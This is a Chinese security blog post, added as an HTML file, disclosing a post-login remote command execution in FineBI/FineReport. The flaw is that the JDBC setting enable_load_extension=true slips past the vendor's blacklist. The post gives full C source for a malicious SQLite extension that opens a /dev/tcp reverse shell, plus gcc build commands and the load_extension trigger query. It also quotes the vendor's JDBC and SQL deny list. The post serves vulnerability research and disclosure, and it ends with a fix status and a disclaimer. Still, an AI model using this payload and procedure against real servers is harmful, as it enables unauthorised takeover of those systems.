@@ -1,0 +1,770 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="0x01 帆软finereBI&#x2F;report后台本地命令执行 JAR包版本号： 6.1.0（JAR：Build#persist-2024.05.30.11.06.10.457）  https:&#x2F;&#x2F;www.finebi.com&#x2F;product&#x2F;download  对应版本6月12日的版本 0x02 poc 构造下载发现官方软件代码,出厂lib中存在sqlite组件。  http:&#x2F;&#x2F;loc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fine报表问题">
+<meta property="og:url" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="0x01 帆软finereBI&#x2F;report后台本地命令执行 JAR包版本号： 6.1.0（JAR：Build#persist-2024.05.30.11.06.10.457）  https:&#x2F;&#x2F;www.finebi.com&#x2F;product&#x2F;download  对应版本6月12日的版本 0x02 poc 构造下载发现官方软件代码,出厂lib中存在sqlite组件。  http:&#x2F;&#x2F;loc">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614022512688.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614022553224.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614023128668.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614022840926.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614022922220.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614024201059.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614024335360.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614024718057.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614025114552.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614025435321.png">
+<meta property="og:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614025745936.png">
+<meta property="article:published_time" content="2024-08-04T15:55:24.000Z">
+<meta property="article:modified_time" content="2024-08-04T16:11:15.430Z">
+<meta property="article:author" content="unam4">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://unam4.github.io/2024/08/04/fine%E6%8A%A5%E8%A1%A8%E9%97%AE%E9%A2%98/image-20240614022512688.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>fine报表问题 - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="fine报表问题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-08-04 23:55" pubdate>
+          2024年8月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          469 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          4 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">fine报表问题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x01-帆软finereBI-report后台本地命令执行"><a href="#0x01-帆软finereBI-report后台本地命令执行" class="headerlink" title="0x01 帆软finereBI&#x2F;report后台本地命令执行"></a>0x01 帆软finereBI&#x2F;report后台本地命令执行</h2><p><img src="image-20240614022512688.png" srcset="/img/loading.gif" lazyload alt="image-20240614022512688"></p>
+<p>JAR包版本号：</p>
+<p>6.1.0（JAR：Build#persist-2024.05.30.11.06.10.457） </p>
+<p><a target="_blank" rel="noopener" href="https://www.finebi.com/product/download">https://www.finebi.com/product/download</a></p>
+<p><img src="image-20240614022553224.png" srcset="/img/loading.gif" lazyload alt="image-20240614022553224"></p>
+<p>对应版本6月12日的版本</p>
+<h3 id="0x02-poc-构造"><a href="#0x02-poc-构造" class="headerlink" title="0x02 poc 构造"></a>0x02 poc 构造</h3><p>下载发现官方软件代码,出厂lib中存在sqlite组件。</p>
+<p><img src="image-20240614023128668.png" srcset="/img/loading.gif" lazyload alt="image-20240614023128668"></p>
+<p><a target="_blank" rel="noopener" href="http://localhost:37799/webroot/decision#/management/connection">http://localhost:37799/webroot/decision#/management/connection</a></p>
+<p>在url可以配置数据库连接</p>
+<p><img src="image-20240614022840926.png" srcset="/img/loading.gif" lazyload alt="image-20240614022840926"></p>
+<p>jdbcurl可控这里可以是设置为 <strong>jdbc:sqlite:DBPATH?enable_load_extension&#x3D;true</strong></p>
+<p>开启**load_extension()**函数</p>
+<p><a target="_blank" rel="noopener" href="https://sqlite.readdevdocs.com/loadext.html">https://sqlite.readdevdocs.com/loadext.html</a> 这里有恶意dll 编写模版。</p>
+<p>这里我是mac系统;</p>
+<p>对应的恶意dll文件代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sqlite3ext.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><br>SQLITE_EXTENSION_INIT1<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _WIN32</span><br>__declspec(dllexport)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Initializes the SQLite extension.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * @param db SQLite database pointer</span><br><span class="hljs-comment"> * @param pzErrMsg Error message pointer</span><br><span class="hljs-comment"> * @param pApi SQLite API routines pointer</span><br><span class="hljs-comment"> * @return SQLITE_OK on success</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sqlite3_extension_init</span><span class="hljs-params">(</span><br><span class="hljs-params">    sqlite3 *db,</span><br><span class="hljs-params">    <span class="hljs-type">char</span> **pzErrMsg,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> sqlite3_api_routines *pApi</span><br><span class="hljs-params">)</span> &#123;<br>    <span class="hljs-type">int</span> rc = SQLITE_OK;<br>    SQLITE_EXTENSION_INIT2(pApi);<br><br>    <span class="hljs-type">pid_t</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;fork error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 父进程继续执行</span><br>        <span class="hljs-comment">// 可以在此处添加额外的代码逻辑</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-comment">// 父进程持续执行其他任务</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 子进程继续执行</span><br>    umask(<span class="hljs-number">0</span>); <span class="hljs-comment">// 设置文件权限掩码</span><br><br>    <span class="hljs-comment">// 创建新会话，并成为会话组组长</span><br>    <span class="hljs-keyword">if</span> (setsid() &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;setsid error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// 关闭标准输入、输出、错误输出</span><br>    close(STDIN_FILENO);<br>    close(STDOUT_FILENO);<br>    close(STDERR_FILENO);<br><br>    <span class="hljs-comment">// 打开一个新的文件描述符作为标准输入、输出、错误输出</span><br>    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/null&quot;</span>, O_RDWR); <span class="hljs-comment">// 或者使用其他文件路径</span><br>    dup2(fd, STDIN_FILENO);<br>    dup2(fd, STDOUT_FILENO);<br>    dup2(fd, STDERR_FILENO);<br>    close(fd);<br><br>    <span class="hljs-comment">// 执行需要在后台运行的代码</span><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;/bin/sh -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, (<span class="hljs-type">char</span>* <span class="hljs-type">const</span>*)args, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> rc;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>填写好接收反弹shell的地址。</p>
+<p>使用gcc编译成恶意的动态链接库。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-comment">//Mac       gcc -fPIC -dynamiclib -o poc1.dylib poc.c</span><br><span class="hljs-comment">//linux     gcc -fPIC -shared  -o liboutput.so poc.c</span><br></code></pre></td></tr></table></figure>
+
+<p>然后修改成</p>
+<p>然后在<strong>校验语句</strong>这里输入语句执行我们恶意动态库文件**SELECT load_extension(‘poc.dylib’)**； 修改为dylic的路径。</p>
+<p>执行后nc接收到shell。</p>
+<p><img src="image-20240614022922220.png" srcset="/img/loading.gif" lazyload alt="image-20240614022922220"></p>
+<h3 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h3><p>与finereport有点不同，</p>
+<p>com.fr.decision.webservice.v10.datasource.connection.ConnectionService.getDriverPath</p>
+<p><img src="image-20240614024201059.png" srcset="/img/loading.gif" lazyload alt="image-20240614024201059"></p>
+<p>在这里接受我们传入的jdbc连接</p>
+<p>om.fr.decision.webservice.v10.datasource.connection.processor.impl.ConnectionProcessorFactory.getDriverPath</p>
+<p><img src="image-20240614024335360.png" srcset="/img/loading.gif" lazyload alt="image-20240614024335360"></p>
+<p>com.fr.decision.webservice.v10.datasource.connection.processor.impl.JDBCConnectionProcessor.convertToJDBCConnectio</p>
+<p><img src="image-20240614024718057.png" srcset="/img/loading.gif" lazyload alt="image-20240614024718057"></p>
+<p>一系列调用后来看这里，完成jdbc链接的赋值，最后调用validateSettings进行检查</p>
+<p>com.fr.decision.webservice.v10.datasource.connection.processor.impl.JDBCConnectionProcessor.validateSettings</p>
+<p><img src="image-20240614025114552.png" srcset="/img/loading.gif" lazyload alt="image-20240614025114552"></p>
+<p>这里会反射获取数据库服务，然后调用 JDBCSecurityChecker.checkUr进行检查。</p>
+<p>com.fr.data.core.db.JDBCSecurityChecker#check</p>
+<p><img src="image-20240614025435321.png" srcset="/img/loading.gif" lazyload alt="image-20240614025435321"></p>
+<p>然后在黑名单进行匹配。</p>
+<p><img src="image-20240614025745936.png" srcset="/img/loading.gif" lazyload alt="image-20240614025745936"></p>
+<p>对应的黑名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"> <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InsecurityElement[] FORBIDDEN_ELEMENTS_OF_URL = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityElement</span>[] &#123; <br>    (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;INIT=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;allowLoadLocalInfile=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;autoDeserialize=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;clientRerouteServerListJNDIName=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;jcr:jndi:&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;slaveHost=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;sqlite::resource&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;mysql:fabric&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;socketFactory=&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;loggerFile=&quot;</span>), <br>    (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;TRIGGER&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLParameter</span>(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityURLResource</span>() &#125;;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> InsecurityElement[] FORBIDDEN_ELEMENTS_OF_VALIDATION_QUERY = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecurityElement</span>[] &#123; (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;create&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;drop&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;alter&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;insert&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;delete&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;merge&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;attach&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;benchmark&quot;</span>), (InsecurityElement)<span class="hljs-keyword">new</span> <span class="hljs-title class_">InsecuritySQLKeyword</span>(<span class="hljs-string">&quot;xp_dirtree&quot;</span>) &#125;;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>可以看到<strong>enable_load_extension&#x3D;true</strong> 不在黑名单中，最后找成了执行恶意动态库。</p>
+<p>过于复杂，推荐前端复现。</p>
+<h3 id="0x04-修复"><a href="#0x04-修复" class="headerlink" title="0x04 修复"></a>0x04 修复</h3><p>​		等待官网修复，截止报告提交时间2024年6月14日，通杀所有版本。 截止8.4日，最新版已修复</p>
+<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>此文章 仅用于教育目的。请负责任地使用它，并且仅在您有明确测试权限的系统上使用。滥用此 PoC 可能会导致严重后果。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>fine报表问题</div>
+      <div>https://unam4.github.io/2024/08/04/fine报表问题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年8月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/08/04/Apache-Wicket%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E5%AE%98%E6%96%B9%E8%AE%A4%E4%B8%BA%E6%98%AF%E6%AD%A3%E5%B8%B8%E5%8A%9F%E8%83%BD/" title="Apache Wicket代码执行(官方认为是正常功能)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Apache Wicket代码执行(官方认为是正常功能)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/04/o2oa%E5%AE%A1%E8%AE%A1/" title="o2oa审计">
+                        <span class="hidden-mobile">o2oa审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
